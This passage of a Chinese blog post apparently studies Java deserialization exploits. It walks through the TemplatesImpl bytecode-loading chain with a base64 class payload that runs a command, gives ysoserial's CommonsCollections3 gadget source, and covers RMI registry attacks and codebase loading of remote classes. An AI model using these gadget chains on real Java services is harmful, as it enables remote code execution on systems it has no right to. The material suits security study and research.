<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory); <span class="comment">// 实例化了TransformerImpl </span></span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line">	TemplatesImpl#newTransformer()</span><br><span class="line">		TemplatesImpl#getTransletInstance()</span><br><span class="line">			TemplatesImpl#defineTransletClasses()</span><br><span class="line">				TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<blockquote>
<p>另外，值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须 是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。</p>
</blockquote>
<p>所以我们可以先写一个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> TpmlDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloTpml</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloTpml</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译生成字节码文件，并将字节码传到前面我们向利用的<code>defineClass</code>中，再写一个调用的类</p>
<p><img src="https://img-blog.csdnimg.cn/e4fd0dd079c8416a9479367bc178a6d5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Define</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAJAoABwAWCgAXABgIABkKABcAGgcAGwcAHAcAHQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAeAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHABwHABsBAApTb3VyY2VGaWxlAQALSGVsbG9ULmphdmEMAA8AEAcAHwwAIAAhAQAEY2FsYwwAIgAjAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABkhlbGxvVAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABgAHAAAAAAADAAEACAAJAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAAMAAwAAAAEAAEADQABAAgADgACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQAMAAAABAABAA0AAQAPABAAAQAKAAAAWAACAAIAAAASKrcAAbgAAhIDtgAEV6cABEyxAAEABAANABAABQACAAsAAAAWAAUAAAAUAAQAFwANABsAEAAZABEAHAARAAAAEAAC/wAQAAEHABIAAQcAEwAAAQAUAAAAAgAV&quot;</span>); <span class="comment">// 字节码base64加密之后的字符串</span></span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;null&quot;</span>); <span class="comment">// 不为空就好 无要求</span></span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl()); <span class="comment">// defineTransletClasses方法中会存在调用 防止报错</span></span><br><span class="line"></span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(TemplatesImpl obj, String bytecodes, Object o)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(bytecodes); <span class="comment">// 因为是私有属性 用反射实现设置</span></span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/dc911700e5424657a6b1957af664c422.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h4 id="Ysoserial"><a href="#Ysoserial" class="headerlink" title="Ysoserial"></a>Ysoserial</h4><blockquote>
<p>基于CC1修改的CC3 主要是把InvokeTransformers换成了InstantiateTransformer</p>
</blockquote>
<p>因为官方对于ysoserial出了过滤器，将InvokeTransformers放入了黑名单里</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections3</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Object templatesImpl = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// inert chain for setup</span></span><br><span class="line">      <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">         <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">      <span class="comment">// real chain for after setup</span></span><br><span class="line">      <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">                  <span class="keyword">new</span> Class[] &#123; Templates.class &#125;,</span><br><span class="line">                  <span class="keyword">new</span> Object[] &#123; templatesImpl &#125; )&#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">      Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> handler;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      PayloadRunner.run(CommonsCollections3.class, args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据链子，最后面调用的应该是<code>transform</code>，这里调用了某个类的构造方法，打断点调试的时候发现input的值是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="keyword">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs); <span class="comment">// 会将我们传进去的Templates进行实例化</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h5><p>他的构造方法实现了<code>(TransformerImpl) templates.newTransformer()</code>，就直接实现了先调用<code>TemplatesImpl#newTransformer</code>，从而完成整个链子，而字节码是在<code>Gadgets#createTemplatesImpl</code>中形成的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">    TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RMI简单入门"><a href="#RMI简单入门" class="headerlink" title="RMI简单入门"></a>RMI简单入门</h3><p>RMI(Remote Method Invocation)，远程方法调用，是Java独有的一种机制，允许运行在一个Java虚拟机的对象调用另一个Java虚拟机上对象的方法</p>
<h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><p>RMI和RPC类似，但RPC作为C语言的一个分支，主要关注数据结构，而RMI不仅使用数据结构，还会适用对象</p>
<p>在一个对象可以与RMI一起使用之前，这个对象必须是可序列化的（RMI的传输时基于反序列化的）。RMI的远程对象是通过引用传递的，而非远程对象是通过复制传递</p>
<p>对于任何一个以对象为参数的RMI接口，都可以发一个自己构建的对象，迫使服务器端将这个对象按任何一个存在于服务端classpath中的可序列化类来反序列化恢复对象</p>
<p><strong>三个主体：</strong></p>
<p>1.Client 客户端</p>
<p>2.Server 服务端</p>
<p>3.Registry 注册中心</p>
<p><strong>RMI Server</strong>分成三部分</p>
<blockquote>
<ol>
<li>一个继承<code>java.rmi.Remote</code>的接口，其中定义我们要远程调用的函数，并且每个方法必须要抛出<code>java.rmi.RemoteException</code></li>
<li>一个实现此接口的类，通常都会扩展<code>java.rmi.UnicastRemoteObject</code></li>
<li>一个主类，用来创建Registry，并将上面的类实例化之后绑定到一个地址</li>
</ol>
</blockquote>
<p><strong>存根和骨架</strong></p>
<p>用于远程对象的实现。</p>
<p>存根(stub)是想调用的方法的对象所代理的本地代码；</p>
<p>骨架(skeleton)从存根接收远程方法调用并将它们传递给对象</p>
<p><strong>RMI Registry</strong></p>
<p>主要流程：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1519089/1632667693674-ef6724af-9a79-45d6-a87e-b334d3948bd4.png"></p>
<blockquote>
<p>RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。</p>
</blockquote>
<p>例子：</p>
<p>首先创建一个扩展了Remote的接口，并声明一个我们需要调用的方法，记得抛出<code>RemoteException</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RmiInterface</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String param)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建一个实现该接口的类，并且继承了<code>UnicastRemoteObject</code>，重写方法，并在这里建立<code>Registry</code>并向注册建立远程对象，将对象实例和Registry的<code>hello</code>绑定在一起</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloHandler</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">RmiInterface</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String hello = <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">HelloHandler</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String param)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hello+param;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        RmiInterface rmiInterface = <span class="keyword">new</span> HelloHandler();</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>,rmiInterface);</span><br><span class="line">        <span class="comment">// Naming.bind(&quot;rmi://ip:port/hello&quot;,rmiInterface) 远程写法</span></span><br><span class="line">        <span class="comment">// Naming.bind(&quot;hello&quot;,rmiInterface) 本地写法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端：通过<code>LocateRegistry.getRegistry</code>访问远程的registry对象，并通过lookup方法找到绑定了对象实例的skeleton，然后调用相应的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">            RmiInterface rmiInterface = (RmiInterface) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            String name = <span class="string">&quot;Ameuu&quot;</span>;</span><br><span class="line">            System.out.println(rmiInterface.hello(name));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/3e38745a45d34f5e81c741ad242f5067.png"></p>
<h4 id="RMI安全"><a href="#RMI安全" class="headerlink" title="RMI安全"></a>RMI安全</h4><p>我们仅从客户端角度来看一下RMI：<br>客户端连接<code>Registry</code>并去寻找某个Name，从而找到其绑定的对象实例，然后去调用这个远程对象的某个方法</p>
<p>那么：</p>
<blockquote>
<ol>
<li>如果我们能访问RMI Registry服务，如何对其攻击？ </li>
<li>如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地 址），能不能进行攻击？</li>
</ol>
</blockquote>
<h5 id="攻击Registry"><a href="#攻击Registry" class="headerlink" title="攻击Registry"></a>攻击Registry</h5><p>Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。</p>
<p>但是可以通过list获取目标上绑定的所有对象、通过lookup获取某个对象</p>
<p><a href="https://github.com/NickstaDB/BaRMIe">BaRMIe</a></p>
<h5 id="codebase执行任意代码"><a href="#codebase执行任意代码" class="headerlink" title="codebase执行任意代码"></a>codebase执行任意代码</h5><p><strong>codebase</strong>是一个地址，在RMI流程中，客户端和服务端直接传递的是序列化的对象，在反序列化的时候会去找相应的类进行实例化，而如果在本地找不到的时候机会自动去codebase里面找，而相应的就产生了问题，如果codebase是我们可以利用的，那么有可能可以加载恶意类</p>
<p>条件：</p>
<blockquote>
<ul>
<li>安装并配置了SecurityManager</li>
<li>Java版本低于7u21、6u45，或者设置了java.rmi.useCodebaseOnly=false，因为在java7u21、6u45的时候修改默认设置java.rmi.useCodebaseOnly=true，这使得java虚拟机只信任预先配置好的<code>codebase</code>，不再支持从RMI请求中获取</li>
</ul>
</blockquote>
<p>例子（代码来自P神：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ICalc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ICalc</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Calc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">ICalc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        Integer sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">            sum += param;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// RemoteRMIServer.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> SecurityManager());</span><br><span class="line">        &#125;</span><br><span class="line">        Calc h = <span class="keyword">new</span> Calc();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;refObj&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RemoteRMIServer().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// client.policy</span></span><br><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译并配置参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac *.java</span><br><span class="line">java -D java.rmi.server.hostname=192.168.64.1 -D java.rmi.server.useCodebaseOnly=false -D java.security.policy=client.policy RemoteRMIServer</span><br></pre></td></tr></table></figure>

<p>其中<code>java.rmi.server.hostname</code>为服务器的IP地址，远程调用时需要根据这个值来访问RMI Server。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// RMIClient.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payload</span> <span class="keyword">extends</span> <span class="title">ArrayList</span>&lt;<span class="title">Integer</span>&gt; </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ICalc r = (ICalc)</span><br><span class="line">            Naming.lookup(<span class="string">&quot;rmi://192.168.135.142:1099/refObj&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> Payload();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIClient().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -D java.rmi.server.useCodebaseOnly=false -</span><br><span class="line">D java.rmi.server.codebase=http://example.com/RMIClient</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在最开始就报错了 所以复现就先搁置了 不过这个代码执行的方法条件比较苛刻 也不常用（大概</p>
</blockquote>
<h3 id="JNDI入门"><a href="#JNDI入门" class="headerlink" title="JNDI入门"></a>JNDI入门</h3><p>JNDI（Java Naming and Directory Interface），是SUN公司提供的⼀种标准的<strong>Java命名系统接⼝</strong>。为开发⼈员提供了查找和访问各种命名和⽬录服务的通⽤、统⼀的接⼝，类似JDBC都是构建在抽象层上。 现在JNDI已经成为J2EE的标准之⼀，所有的J2EE容器都必须提供⼀个JNDI的服务。</p>
<p>通过返回Reference和调用lookup获得相应的数据源。</p>
<p><img src="https://img-blog.csdnimg.cn/be2c8e2e1a2c4983a3ed9b3505a21ee7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
